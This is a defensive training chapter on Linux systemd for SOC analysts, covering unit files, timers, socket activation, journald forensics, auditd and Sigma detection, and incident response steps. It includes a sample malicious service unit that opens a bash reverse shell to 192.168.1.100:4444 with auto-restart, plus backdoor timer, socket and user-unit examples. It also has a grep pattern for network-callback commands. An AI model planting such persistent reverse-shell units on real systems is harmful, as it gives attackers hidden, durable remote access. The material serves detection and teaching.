# Linux/06 — Systemd & Init

> systemd is PID 1 — the first userspace process, parent of everything else, and the last thing running before the kernel shuts down. It controls what starts, when it starts, how it restarts on failure, and who it runs as. Attackers who plant a malicious systemd unit own a privileged, auto-restarting, boot-persistent execution environment.

![MITRE](https://img.shields.io/badge/MITRE-T1543.002%20|%20T1053.006%20|%20T1574-red)
![Platform](https://img.shields.io/badge/Platform-Linux-orange)

---

## systemd Architecture

```
Kernel boots
    |
    v
PID 1: /usr/lib/systemd/systemd
    |
    +-- systemd-journald      log collection
    +-- systemd-udevd         device management
    +-- systemd-networkd      network configuration
    +-- systemd-resolved      DNS resolution
    +-- systemd-logind        user session management
    |
    +-- Target: multi-user.target
    |       |
    |       +-- sshd.service
    |       +-- cron.service
    |       +-- rsyslog.service
    |       +-- [your malicious service here]
    |
    +-- Target: graphical.target
            |
            +-- display-manager.service
```

systemd replaces the old SysV init system. Instead of sequential shell scripts, it uses declarative unit files that describe dependencies, ordering, and restart behavior.

---

## Unit Files

The fundamental building block of systemd. A unit file describes a resource systemd manages.

### Unit Types

| Extension | Type | Purpose |
|-----------|------|---------|
| `.service` | Service | Long-running process |
| `.timer` | Timer | Scheduled execution (replaces cron) |
| `.socket` | Socket | Socket-activated service |
| `.target` | Target | Group of units (like runlevels) |
| `.mount` | Mount | Filesystem mount point |
| `.path` | Path | File/directory monitoring trigger |
| `.slice` | Slice | Resource control group |

### Unit File Locations (priority order)

```
/etc/systemd/system/          highest priority — local admin config
/run/systemd/system/          runtime units (non-persistent)
/usr/local/lib/systemd/system/ locally compiled software
/usr/lib/systemd/system/      package-installed units (lowest priority)
~/.config/systemd/user/       user-level units (no root required)
```

---

## Service Unit Structure

```ini
[Unit]
Description=Human readable description
Documentation=man:sshd(8)
After=network.target        # start after network is up
Requires=network.target     # hard dependency
Wants=network-online.target # soft dependency
ConditionPathExists=/etc/ssh/sshd_config

[Service]
Type=forking                # process forks; parent exits
ExecStart=/usr/sbin/sshd -D
ExecReload=/bin/kill -HUP $MAINPID
ExecStop=/bin/kill -TERM $MAINPID
PIDFile=/run/sshd.pid
Restart=on-failure          # restart if crashes
RestartSec=5s
User=root
Group=root
Environment=LANG=en_US.UTF-8

[Install]
WantedBy=multi-user.target  # enabled for multi-user boot
```

### Service Types

| Type | Behavior | Attacker Use |
|------|---------|--------------|
| `simple` | Main process is ExecStart (default) | Most backdoors |
| `forking` | Process forks; parent exits | Daemons that daemonize |
| `oneshot` | Runs once and exits | Payload launchers |
| `notify` | Process signals readiness | — |
| `idle` | Waits until other jobs complete | — |

### Restart Behavior

```ini
Restart=always        # restart unconditionally (attacker favorite)
Restart=on-failure    # restart only on non-zero exit
Restart=no            # never restart (default)
RestartSec=10         # wait 10 seconds before restart
```

`Restart=always` means even if you kill the malicious process, systemd immediately relaunches it. You must disable the unit before killing the process.

---

## Malicious Service Unit — Example

```ini
# /etc/systemd/system/system-network-monitor.service
# Named to blend with legitimate services

[Unit]
Description=System Network Monitor
After=network.target
Before=shutdown.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
```

```bash
# Attacker enables and starts it
systemctl daemon-reload
systemctl enable system-network-monitor.service
systemctl start system-network-monitor.service
```

---

## systemd Timers (T1053.006)

Timers are the systemd replacement for cron. A timer unit activates a corresponding service unit on a schedule.

```ini
# /etc/systemd/system/beacon.timer
[Unit]
Description=Beacon Timer

[Timer]
OnBootSec=2min          # first run: 2 min after boot
OnUnitActiveSec=10min   # subsequent runs: every 10 min
Persistent=true         # run if time was missed (e.g. system was off)

[Install]
WantedBy=timers.target
```

```ini
# /etc/systemd/system/beacon.service
[Unit]
Description=Beacon Service

[Service]
Type=oneshot
ExecStart=/tmp/.beacon
```

**Stealthier than cron** because:
- Not visible in `crontab -l`
- Stored in /etc/systemd/ which is less scrutinized than /etc/cron.d/
- Timer and service names can be made to look legitimate

```bash
# List all active timers
systemctl list-timers --all --no-pager

# Show timer details
systemctl show beacon.timer
```

---

## Socket Activation

systemd can listen on a socket and only start the service when a connection arrives. This reduces resource usage and allows delayed service startup.

```ini
# /etc/systemd/system/backdoor.socket
[Unit]
Description=Backdoor Socket

[Socket]
ListenStream=0.0.0.0:8443   # listen on all interfaces port 8443
Accept=yes

[Install]
WantedBy=sockets.target
```

Detection: A socket unit listening on an unexpected port with an associated service that executes unusual commands.

---

## User-Level systemd Units

Regular users can create and run systemd units without root — stored in `~/.config/systemd/user/`. These units run with the user's privileges and start at user login.

```bash
# Create user-level persistence (no root needed)
mkdir -p ~/.config/systemd/user/
cat > ~/.config/systemd/user/updater.service << 'UNIT'
[Unit]
Description=User Updater

[Service]
Type=simple
ExecStart=/home/user/.local/bin/.payload
Restart=always

[Install]
WantedBy=default.target
UNIT

systemctl --user enable updater.service
systemctl --user start updater.service
```

```bash
# Enumerate user-level units for all users
for home in /home/* /root; do
  user=$(basename $home)
  unitdir="$home/.config/systemd/user"
  if [ -d "$unitdir" ]; then
    echo "=== $user ==="
    ls -la "$unitdir/"
    cat "$unitdir/"*.service 2>/dev/null
  fi
done
```

---

## systemd Journal

journald collects logs from all services, the kernel, and boot messages in a binary structured format.

```bash
# View all logs
journalctl

# Follow live
journalctl -f

# Specific service
journalctl -u sshd.service
journalctl -u suspicious.service

# Since last boot
journalctl -b

# Previous boot (useful if system was rebooted to cover tracks)
journalctl -b -1

# Time range
journalctl --since "2024-01-01" --until "2024-01-02"

# Kernel messages
journalctl -k

# Show only errors
journalctl -p err

# Export for analysis
journalctl --output=json > /tmp/journal_export.json
```

**Forensic value:** journald persists across reboots (in `/var/log/journal/`). If an attacker cleared /var/log/auth.log but not the journal, you can recover events. Journal entries include the source service, PID, UID, and boot ID — enabling timeline reconstruction.

---

## Detection — Malicious Units

### Enumerate All Non-Standard Units

```bash
# Find service files not installed by packages
for unit in /etc/systemd/system/*.service; do
  [ -f "$unit" ] || continue
  # Check if this file is owned by a package
  if command -v dpkg &>/dev/null; then
    pkg=$(dpkg -S "$unit" 2>/dev/null)
  elif command -v rpm &>/dev/null; then
    pkg=$(rpm -qf "$unit" 2>/dev/null)
  fi
  [ -z "$pkg" ] && echo "NOT PACKAGED: $unit"
done

# Inspect ExecStart of all enabled services
systemctl list-unit-files --state=enabled --type=service --no-pager | \
  awk 'NR>1{print $1}' | while read unit; do
    exec=$(systemctl show "$unit" -p ExecStart 2>/dev/null | cut -d= -f2-)
    echo "=== $unit ===" 
    echo "$exec"
  done

# Find units with network callbacks in ExecStart
grep -r "bash.*tcp\|nc \|curl\|wget\|python.*socket" \
  /etc/systemd/system/ /usr/lib/systemd/system/ 2>/dev/null
```

### systemd Unit Modification Detection (auditd)

```bash
# Monitor systemd unit directories
auditctl -w /etc/systemd/system -p wa -k systemd_persistence
auditctl -w /usr/lib/systemd/system -p wa -k systemd_persistence

# Monitor systemctl execution
auditctl -w /bin/systemctl -p x -k systemctl_exec
```

### Key Commands for IR

```bash
# All units and their states
systemctl list-units --all --no-pager

# Enabled units (will survive reboot)
systemctl list-unit-files --state=enabled --no-pager

# Active timers
systemctl list-timers --all --no-pager

# Failed units (may indicate tampered services crashing)
systemctl --failed

# Full unit file content
systemctl cat suspicious.service

# Service execution history from journal
journalctl -u suspicious.service --no-pager

# When was a unit last activated
systemctl show suspicious.service -p ActiveEnterTimestamp

# Disable and stop malicious unit
systemctl stop malicious.service
systemctl disable malicious.service
rm /etc/systemd/system/malicious.service
systemctl daemon-reload
```

---

## MITRE ATT&CK Mapping

| Technique | ID |
|-----------|-----|
| Create or Modify System Process: Systemd Service | T1543.002 |
| Scheduled Task/Job: Systemd Timer | T1053.006 |
| Boot/Logon Autostart: Systemd Service | T1543.002 |
| Hijack Execution Flow | T1574 |

---

## Sigma Rule — New Systemd Service

```yaml
title: New Systemd Service Unit Created
id: c9d0e1f2-a3b4-5678-cdef-789012345678
status: stable
description: >
  Detects creation of new systemd service unit files.
  Attackers create malicious service units for persistent
  execution that survives reboots.
author: Solomon James (@Jaysolex)
tags:
  - attack.persistence
  - attack.t1543.002
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: PATH
    name|startswith:
      - '/etc/systemd/system/'
      - '/usr/local/lib/systemd/system/'
    name|endswith: '.service'
    nametype: CREATE
  condition: selection
falsepositives:
  - Package installations creating service units
  - Admin creating legitimate custom services
level: medium
```

---

## Practitioner Notes

**On Restart=always as an IR challenge:** Before killing a suspected malicious process managed by systemd, disable the unit first — otherwise systemd relaunches it within seconds. The sequence is: `systemctl stop unit`, `systemctl disable unit`, then remove the unit file, then `systemctl daemon-reload`. Killing the process without disabling the unit first tips off the attacker and achieves nothing.

**On previous boot journals:** Attackers sometimes reboot the system after an intrusion hoping to clear volatile evidence. journald's persistent journal in `/var/log/journal/` retains logs from previous boots. `journalctl -b -1` shows the previous boot, `-b -2` the one before that. This is frequently overlooked during IR and can reveal attacker activity before the reboot.

**On user-level units and detection gaps:** Many IR tools and detection scripts only check `/etc/systemd/system/`. User-level units in `~/.config/systemd/user/` require no root privileges to create and persist with the user account. Always enumerate user-level units for every account on the system.

---

## Knowledge Validation

**Why must you disable a malicious systemd service before stopping it?**
systemd monitors all managed processes. When a service with `Restart=always` or `Restart=on-failure` exits, systemd immediately relaunches it after RestartSec seconds. Stopping without disabling only terminates the current instance — systemd relaunches it. The correct sequence is: stop, disable, remove unit file, daemon-reload. This prevents restart and removes the boot persistence.

**What is the forensic advantage of journald over /var/log/auth.log during an IR where an attacker cleared text logs?**
journald stores logs in a binary structured format in `/var/log/journal/` that persists across reboots and is separate from the flat text files rsyslog writes. If an attacker cleared `/var/log/auth.log` but not the journal, `journalctl` can still retrieve authentication events for the incident window. Additionally, the journal includes events from previous boots via `journalctl -b -1`.

**A socket-activated unit is listening on port 8443 on a server. How do you investigate it?**
List all socket units with `systemctl list-sockets --no-pager`. Identify the socket unit listening on 8443 and its associated service with `systemctl cat unit.socket`. Read the ExecStart of the associated service to determine what it executes on connection. Check when the unit was created with `stat /etc/systemd/system/unit.socket`. Review journal for the service execution history with `journalctl -u unit.service`. Cross-reference with auditd records for when the unit file was written.

---

*Linux/06-Systemd-Init | OS-Internals-for-SOC | Solomon James (@Jaysolex)*
